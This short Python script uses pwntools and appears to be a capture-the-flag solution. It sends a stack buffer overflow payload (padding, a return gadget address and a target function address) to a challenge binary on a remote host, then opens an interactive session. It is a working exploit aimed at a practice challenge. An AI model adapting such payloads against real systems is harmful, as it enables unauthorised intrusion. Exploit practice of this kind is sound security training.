from pwn import *

e = ELF("pwnme")
r = e.process()
r = remote('0.cloud.chals.io', 13545)
nop_ret = 0x40110e;
#gdb.attach(r, '''
# break vuln
#''')


print(r.recv())

payload = b'a'*48 + b'b'*8 + p64(nop_ret) + p64(0x40119a)

r.sendline(payload)
#print(r.recv())

r.interactive()
